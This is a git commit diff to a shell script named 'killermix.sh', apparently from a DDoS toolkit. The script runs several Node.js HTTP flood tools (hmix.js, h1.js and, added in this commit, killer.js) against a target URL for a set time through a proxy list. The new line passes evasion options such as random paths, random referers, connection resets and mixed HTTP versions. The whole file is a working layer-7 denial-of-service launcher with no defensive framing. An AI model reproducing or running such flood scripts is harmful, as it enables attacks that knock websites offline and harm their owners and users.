7b829738839c1091421b83d6866bcad651a14f9c
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-14 07:39:56 +0700

    HER

--- killermix.sh
+++ killermix.sh
@@ -14,9 +14,12 @@ done > live.txt
 export NODE_OPTIONS=--max-old-space-size=8192
 
 node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
+node killer.js POST "$URL" "$TIME" 10 128 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset --multipath 5 &
 
 node h1.js POST "$URL" live.txt "$TIME" 999 10 randomstring="true" &
 node h1.js GET "$URL" live.txt "$TIME" 999 10 randomstring="true" &
+
+
 
 wait
 pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
